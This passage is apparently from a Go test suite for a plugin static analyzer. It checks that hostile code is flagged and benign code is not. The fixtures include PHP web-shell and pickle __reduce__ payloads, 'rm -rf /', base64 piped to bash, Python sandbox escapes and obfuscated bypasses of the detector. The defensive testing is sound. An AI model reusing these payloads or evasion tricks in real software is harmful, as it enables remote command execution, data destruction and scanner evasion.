	dir := t.TempDir()
	writeFile(t, dir, "config.py", `data = yaml.load(stream)`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	// yaml.load without Loader is WARNING - plugin stays safe
	if !report.Safe {
		t.Error("expected safe plugin - yaml.load is warning, not critical")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "deserialization" && f.Severity == SeverityWarning {
			found = true
		}
	}
	if !found {
		t.Error("expected deserialization warning for yaml.load")
	}
}

func TestAnalyze_Deserialization_Reduce_Critical(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "evil.py", `
class Exploit:
    def __reduce__(self):
        return (os.system, ("rm -rf /",))
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe - __reduce__ hijack")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "deserialization" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected deserialization critical finding for __reduce__")
	}
}

func TestAnalyze_ClassHierarchyTraversal_Critical(t *testing.T) {
	for _, code := range []string{
		`subs = ().__class__.__bases__[0].__subclasses__()`,
		`cls.__subclasses__()`,
		`for c in obj.__mro__:`,
	} {
		t.Run(code, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "escape.py", code)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Fatalf("expected unsafe for %q", code)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "sandbox_escape" && f.Severity == SeverityCritical {
					found = true
				}
			}
			if !found {
				t.Errorf("expected sandbox_escape critical finding for %q", code)
			}
		})
	}
}

func TestAnalyze_PHP_PregReplaceE_Critical(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "vuln.php", `preg_replace('/.*/e', $_POST['cmd'], '');`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe - preg_replace /e")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected shell_exec critical finding for preg_replace /e")
	}
}

func TestAnalyze_PHP_AssertEncoded_Critical(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "backdoor.php", `assert(base64_decode('c3lzdGVtKCJpZCIpOw=='));`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe - assert with encoded arg")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "obfuscation" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected obfuscation critical finding for PHP assert(base64_decode(...))")
	}
}

func TestAnalyze_PHP_ShellWithVar_Critical(t *testing.T) {
	for _, code := range []string{
		`system($cmd);`,
		`passthru($_GET['cmd']);`,
		`shell_exec($input);`,
	} {
		t.Run(code, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "exec.php", code)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Fatalf("expected unsafe for %q", code)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "shell_exec" && f.Severity == SeverityCritical {
					found = true
				}
			}
			if !found {
				t.Errorf("expected shell_exec critical finding for %q", code)
			}
		})
	}
}

func TestAnalyze_PHP_ChrChain_Warning(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "obf.php", `$s = chr(115).chr(121).chr(115).chr(116);`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Error("expected safe - chr() chain is WARNING not CRITICAL")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "obfuscation" && f.Severity == SeverityWarning {
			found = true
		}
	}
	if !found {
		t.Error("expected obfuscation warning for PHP chr() chain")
	}
}

func TestAnalyze_PHP_StrRot13_Warning(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "obf.php", `eval(str_rot13('flfgrz'));`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	// str_rot13 itself is WARNING; eval makes it CRITICAL via existing rule
	found := false
	for _, f := range report.Findings {
		if f.Category == "obfuscation" && f.Severity == SeverityWarning && f.Description == "PHP str_rot13 (common obfuscation technique)" {
			found = true
		}
	}
	if !found {
		t.Error("expected obfuscation warning for str_rot13")
	}
}

func TestAnalyze_Ruby_KernelExec_Critical(t *testing.T) {
	for _, code := range []string{
		`Kernel.exec("id")`,
		`Kernel.system("ls")`,
		`Kernel.spawn("bash")`,
	} {
		t.Run(code, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "run.rb", code)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Fatalf("expected unsafe for %q", code)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "shell_exec" && f.Severity == SeverityCritical {
					found = true
				}
			}
			if !found {
				t.Errorf("expected shell_exec critical finding for %q", code)
			}
		})
	}
}

func TestAnalyze_Ruby_IOPopen_Critical(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "shell.rb", `IO.popen("ls -la")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe - IO.popen in .rb")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected shell_exec critical finding for IO.popen")
	}
}

func TestAnalyze_Ruby_OpenPipePrefix_Critical(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "inject.rb", `open("|whoami")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe - open('|cmd') in .rb")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("expected shell_exec critical finding for open('|cmd')")
	}
}

func TestAnalyze_Ruby_RulesOnlyApplyToRbFiles(t *testing.T) {
	dir := t.TempDir()
	// Same code in a .py file - should NOT trigger Ruby-scoped rules
	writeFile(t, dir, "shell.py", `IO.popen("ls")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Description == "Ruby IO.popen or %x{} shell execution" {
			t.Error("Ruby rule should not fire on .py file")
		}
	}
}

func TestAnalyze_Go_UnsafePointer_Warning(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "hack.go", `p := unsafe.Pointer(&x)`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if !report.Safe {
		t.Error("expected safe - unsafe.Pointer is WARNING not CRITICAL")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "native_code" && f.Severity == SeverityWarning {
			found = true
		}
	}
	if !found {
		t.Error("expected native_code warning for unsafe.Pointer in .go file")
	}
}

func TestAnalyze_Go_UnsafePointerOnlyInGoFiles(t *testing.T) {
	dir := t.TempDir()
	// Same pattern in .py - should NOT trigger Go-scoped rule
	writeFile(t, dir, "notes.py", `# unsafe.Pointer`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Description == "Go unsafe.Pointer (bypasses type safety)" {
			t.Error("Go unsafe.Pointer rule should not fire on .py file")
		}
	}
}

func TestAnalyze_Base64PipeToShell_Critical(t *testing.T) {
	for _, code := range []string{
		`base64 -d payload.b64 | bash`,
		`base64 --decode encoded.txt | sh`,
		`echo aWQ= | base64 -d | zsh`,
	} {
		t.Run(code, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, "dropper.sh", code)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Fatalf("expected unsafe for %q", code)
			}
			found := false
			for _, f := range report.Findings {
				if f.Category == "obfuscation" && f.Severity == SeverityCritical {
					found = true
				}
			}
			if !found {
				t.Errorf("expected obfuscation critical finding for %q", code)
			}
		})
	}
}

func TestAnalyzePlugin_MinifiedBundleNoFalsePositives(t *testing.T) {
	// Realistic minified-bundle content: regex.exec, Class.Fetch,
	// THREE.System are all standard JS APIs, not dangerous. The tightened
	// patterns must not flag any of these as critical/warning.
	dir := t.TempDir()
	writeFile(t, dir, "dist/index.js",
		`var r=/x/g;r.exec(s);obj.Fetch();THREE.System.run();this.spawn();dispatch.fetch();a.exec(opts);`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Category == "shell_exec" || f.Category == "network" {
			t.Errorf("false positive on minified-bundle method call: %+v", f)
		}
	}
}

func TestAnalyzePlugin_BareExecStillFlagged(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.js", `exec("rm -rf /");`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	var found bool
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Error("bare exec( call must still be flagged")
	}
}

// TestAnalyzerCriticalBypasses covers the 7 bypass payloads identified in the
// empirical audit. Each must produce at least one Critical finding so Safe=false.
func TestAnalyzerCriticalBypasses(t *testing.T) {
	tests := []struct {
		name    string
		file    string
		content string
	}{
		{
			// PHP dot-concat obfuscation: "sys"."tem" folds to "system".
			name:    "php_dot_concat_system",
			file:    "shell.php",
			content: `eval("sys"."tem"."('id');");`,
		},
		{
			// Python f-string literal-only interpolation folds f"{'ev'}{'al'}" to "eval".
			name:    "python_fstring_eval",
			file:    "eval.py",
			content: `eval(f"{'ev'}{'al'}")`,
		},
		{
			// JS .constructor escape: (function(){}).constructor("alert(1)")()
			name:    "js_constructor_escape",
			file:    "escape.js",
			content: `(function(){}).constructor("alert(1)")()`,
		},
		{
			// Python module aliasing: import os as _o; _o.system("id")
			// The alias rule fires Warning; os.system also fires Critical.
			name:    "python_import_alias",
			file:    "alias.py",
			content: `import os as _o; _o.system("id")`,
		},
		{
			// Python getattr(__builtins__) with join-obfuscated argument.
			name:    "python_getattr_builtins_join",
			file:    "bypass.py",
			content: `getattr(__builtins__, "".join(["e","x","e","c"]))`,
		},
		{
			// Go raw syscall by number - only fires on .go files.
			name:    "go_raw_syscall",
			file:    "syscall.go",
			content: `syscall.Syscall(59, 0, 0, 0)`,
		},
		{
			// PHP combo: shell exec + host secret access.
			name:    "php_combo_secret_exfil",
			file:    "exfil.php",
			content: `system($_GET['c']); file_get_contents("/data/jwt.key"); curl_exec($ch);`,
		},
	}

	for _, tt := range tests {
		tt := tt
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			writeFile(t, dir, tt.file, tt.content)

			report, err := AnalyzePlugin(dir)
			if err != nil {
				t.Fatal(err)
			}
			if report.Safe {
				t.Fatalf("expected Safe=false for bypass payload %q; findings: %v", tt.name, report.Findings)
			}
			hasCritical := false
			for _, f := range report.Findings {
				if f.Severity == SeverityCritical {
					hasCritical = true
					break
				}
			}
			if !hasCritical {
				t.Errorf("expected at least one Critical finding for bypass %q; got: %v", tt.name, report.Findings)
			}
		})
	}
}

// TestAnalyzerCriticalBypasses_GoSyscall_NotOnPHP verifies the Go syscall
// rule does not fire on PHP files (extension-scoped rule).
func TestAnalyzerCriticalBypasses_GoSyscall_NotOnPHP(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "test.php", `syscall.Syscall(59, 0, 0, 0)`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Category == "native_code" && f.Description == "raw syscall by number" {
			t.Error("Go raw syscall rule must not fire on .php files")
		}
	}
}

// TestAliasResolution_PHP verifies that PHP string-concat variable callable
// patterns are detected: $f = "sys"."tem"; $f($x) → system($x).
func TestAliasResolution_PHP(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "rce.php", `<?php
$f = "sys"."tem";
$cmd = $_GET['c'];
$f($cmd);
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe - PHP string-concat var-callable should be detected")
	}
	hasCritical := false
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Error("expected Critical finding for PHP $f = 'system'; $f($cmd)")
	}
}

// TestAliasResolution_Python verifies that multi-line os-alias chains are
// detected: import os as _o; m = _o; m.system("id").
func TestAliasResolution_Python(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "alias.py", `import os as _o
m = _o
m.system("id")
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe - multi-line os alias chain should be detected")
	}
	hasCritical := false
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical {
			hasCritical = true
		}
	}
	if !hasCritical {
		t.Error("expected Critical finding for import os as _o; m = _o; m.system()")
	}
}

// TestAliasResolution_NoFalsePositive verifies that assigning a non-dangerous
// string and calling the variable does not trigger a finding.
func TestAliasResolution_NoFalsePositive(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "safe.py", `f = "hello"
f("world")
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical {
			t.Errorf("unexpected Critical shell_exec for benign variable call: %+v", f)
		}
	}
}

// TestAliasResolution_VarReassigned verifies that if a variable is reassigned
// to a non-dangerous value after being set to a dangerous one, no substitution
// occurs and the call is not flagged.
func TestAliasResolution_VarReassigned(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "safe.py", `f = "system"
f = lambda x: x
f("safe")
`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	// After reassignment to a lambda the original binding is invalid.
	// We must NOT substitute system( for f( here.
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical && f.Line == 3 {
			t.Errorf("must not flag f() as system() after var reassignment: %+v", f)
		}
	}
}

// TestAnalyzerV2_FixedPointMultiStepConcat: $x="sys"; $y="tem"; $f=$x.$y; $f(...)
// requires fixed-point alias resolution (single-pass would fail because
// the operands are vars, not literals, when $f is assigned).
func TestAnalyzerV2_FixedPointMultiStepConcat(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.php", `<?php
$x = "sys";
$y = "tem";
$f = $x . $y;
$cmd = $_GET['c'];
$f($cmd);
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	hasCrit := false
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical && f.Category == "shell_exec" {
			hasCrit = true
		}
	}
	if !hasCrit {
		t.Errorf("multi-step concat must produce Critical/shell_exec, got: %+v", report.Findings)
	}
}

// TestAnalyzerV2_FragmentedManyVars: 6 single-letter fragments concatenated
// must not blow up false-positives, but the final concatenated value must
// still trigger.
func TestAnalyzerV2_FragmentedManyVars(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.php", `<?php
$a = "s";
$b = "y";
$c = "s";
$d = "t";
$e = "e";
$f = "m";
$g = $a . $b . $c . $d . $e . $f;
$g("id");
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	hasCrit := false
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical && f.Category == "shell_exec" {
			hasCrit = true
		}
	}
	if !hasCrit {
		t.Errorf("fragmented multi-var concat must trigger, got: %+v", report.Findings)
	}
}

// TestAnalyzerV2_CycleTerminates: $a=$b; $b=$a; $a("x") must not panic and
// must not enter infinite recursion (fixed-point cap protects).
func TestAnalyzerV2_CycleTerminates(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.php", `<?php
$a = $b;
$b = $a;
$a("x");
`)
	// Just ensure no panic and analyze returns.
	if _, err := AnalyzePlugin(dir); err != nil {
		t.Fatal(err)
	}
}

// TestAnalyzerV2_NoFalsePositiveLegitGreeting: a benign multi-string concat
// must not trigger any Critical finding.
func TestAnalyzerV2_NoFalsePositiveLegitGreeting(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.js", `
const a = "hello";
const b = " ";
const c = "world";
const greeting = a + b + c;
console.log(greeting);
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical {
			t.Errorf("benign greeting concat triggered Critical: %+v", f)
		}
	}
}

// TestAnalyzerV2_DictBuiltinAccessLiteral: __builtins__.__dict__["eval"] direct.
func TestAnalyzerV2_DictBuiltinAccessLiteral(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
fn = __builtins__.__dict__["eval"]
fn("print(1)")
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	hasCrit := false
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical && f.Category == "dynamic_import" {
			hasCrit = true
		}
	}
	if !hasCrit {
		t.Errorf("__dict__[literal] must trigger, got: %+v", report.Findings)
	}
}

// TestAnalyzerV2_DictBuiltinAccessResolvedVar: __builtins__.__dict__[v]
// where v resolves to "eval" via f-string fold + alias substitution.
func TestAnalyzerV2_DictBuiltinAccessResolvedVar(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.py", `
v = "eval"
fn = __builtins__.__dict__[v]
fn("print(1)")
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	hasCrit := false
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical && f.Category == "dynamic_import" {
			hasCrit = true
		}
	}
	if !hasCrit {
		t.Errorf("__dict__[var-resolves-to-eval] must trigger, got: %+v", report.Findings)
	}
}

// TestAnalyze_BlockComment_EvalStripped verifies that a JS file whose only
// dangerous payload (eval) is wrapped in a /* … */ block comment produces
// zero findings - the block comment is stripped before analysis.
func TestAnalyze_BlockComment_EvalStripped(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "plugin.js", `/* eval("rm -rf /") */ console.log("ok")`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Category == "obfuscation" || f.Category == "shell_exec" {
			t.Errorf("eval inside block comment must produce no finding, got %s at line %d", f.Category, f.Line)
		}
	}
}

// TestAnalyze_BlockComment_MultilineStrippedLineNumbers verifies that a
// finding on the line AFTER a multi-line block comment reports the correct
// line number (block-comment newlines are preserved).
func TestAnalyze_BlockComment_MultilineStrippedLineNumbers(t *testing.T) {
	dir := t.TempDir()
	// Line 1: /*
	// Line 2: eval("rm -rf /")  ← inside comment, must NOT trigger
	// Line 3: */
	// Line 4: eval(userInput)   ← active code, MUST trigger on line 4
	src := "/*\neval(\"rm -rf /\")\n*/\neval(userInput)"
	writeFile(t, dir, "main.js", src)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "obfuscation" {
			found = true
			if f.Line != 4 {
				t.Errorf("finding must be on line 4 (after block comment), got line %d", f.Line)
			}
		}
	}
	if !found {
		t.Error("eval on line 4 (outside comment) must produce an obfuscation finding")
	}
}

// TestAnalyze_BlockComment_PythonFileUnaffected verifies that Python files
// (which do not use /* */ block comments) are not processed by stripBlockComments
// and that a literal /* in a Python string does not break anything.
func TestAnalyze_BlockComment_PythonFileUnaffected(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "safe.py", `msg = "/* this is a python string */"`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	// No dangerous payload → must be safe.
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical {
			t.Errorf("unexpected critical finding for safe Python file: %+v", f)
		}
	}
}

// TestAnalyzerV2_StoredConstructor: F = (fn).constructor; F("...").
func TestAnalyzerV2_StoredConstructor(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.js", `
const F = (function(){}).constructor;
const evil = F("return this");
console.log(evil());
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	hasCrit := false
	for _, f := range report.Findings {
		if f.Severity == SeverityCritical && f.Category == "sandbox_escape" {
			hasCrit = true
		}
	}
	if !hasCrit {
		t.Errorf("stored constructor must trigger, got: %+v", report.Findings)
	}
}

// TestAnalyzePlugin_ChildProcessImport_Aliased: analyzer must flag the import
// of the child_process module itself, not just the qualified call - the old
// rule only matched `child_process.exec(` literally, so binding the module to
// a variable first (the common real-world pattern) slipped through undetected.
func TestAnalyzePlugin_ChildProcessImport_Aliased(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.js", `
const cp = require("child_process");
cp.exec("id");
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin (aliased child_process require)")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected shell_exec critical finding, got: %+v", report.Findings)
	}
}

func TestAnalyzePlugin_ChildProcessImport_ChainedCall(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.js", `require("child_process").spawnSync("env", []);`)

	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin (chained child_process require)")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected shell_exec critical finding, got: %+v", report.Findings)
	}
}

func TestAnalyzePlugin_ChildProcessImport_StoredMethodRef(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.js", `
const s = require("child_process").spawnSync;
s("env", []);
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin (stored method ref off child_process require)")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected shell_exec critical finding, got: %+v", report.Findings)
	}
}

func TestAnalyzePlugin_ChildProcessImport_ESImport(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.js", `import cp from "child_process";
cp.execSync("id");
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	if report.Safe {
		t.Fatal("expected unsafe plugin (ES import of child_process)")
	}
	found := false
	for _, f := range report.Findings {
		if f.Category == "shell_exec" && f.Severity == SeverityCritical {
			found = true
		}
	}
	if !found {
		t.Errorf("expected shell_exec critical finding, got: %+v", report.Findings)
	}
}

// TestAnalyzePlugin_ChildProcessImport_NoFalsePositive: a module whose name
// merely contains the "child_process" substring (but isn't the module) and a
// member-access `.exec(` on an unrelated object must NOT be flagged by the
// new literal-import rule.
func TestAnalyzePlugin_ChildProcessImport_NoFalsePositive(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "main.js", `
const logger = require("child_process_logger");
pool.exec("SELECT 1");
`)
	report, err := AnalyzePlugin(dir)
	if err != nil {
		t.Fatal(err)
	}
	for _, f := range report.Findings {
		if f.Category == "shell_exec" {
			t.Errorf("unexpected shell_exec finding for non-child_process module/member-access exec: %+v", f)
		}
	}
	if !report.Safe {
		t.Errorf("expected safe plugin, got findings: %+v", report.Findings)
	}
}
